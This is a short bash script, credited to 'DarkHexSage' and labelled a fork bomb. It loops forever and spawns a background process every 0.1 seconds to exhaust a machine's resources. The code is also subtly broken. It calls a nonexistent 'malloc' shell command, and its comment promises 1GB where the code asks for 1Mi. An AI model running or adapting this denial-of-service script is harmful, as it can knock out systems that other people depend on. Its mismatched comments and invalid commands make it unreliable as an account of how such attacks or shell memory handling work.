#!/bin/bash
##by DarkHexSage
# Function to allocate memory but not consume it
allocate_memory() {
    # Allocate a large block of memory (1GB) using the 'malloc' command
    memory_block=$(malloc 1Mi)
    
    # If memory allocation fails, exit the script
    if [ $? -ne 0 ]; then
        echo "Memory allocation failed. Exiting."
        exit 1
    fi
}

# Fork bomb loop
while true; do
    # Call the function to allocate memory
    allocate_memory &

    # Sleep for a short duration to control the rate of forking
    sleep 0.1
done
